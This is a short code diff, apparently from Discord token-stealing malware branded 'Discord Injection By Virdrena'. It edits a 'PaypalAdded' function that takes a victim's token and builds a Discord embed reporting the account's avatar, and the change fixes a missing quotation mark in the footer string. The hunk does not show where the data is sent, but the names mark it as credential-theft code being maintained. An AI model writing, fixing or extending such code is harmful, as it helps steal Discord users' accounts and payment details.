@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 🎉・Discord Injection By Virdrena・https://github.com/urwy',
+          text: '🎉・Discord Injection By Virdrena・https://github.com/urwy',
         },
       },
     ],
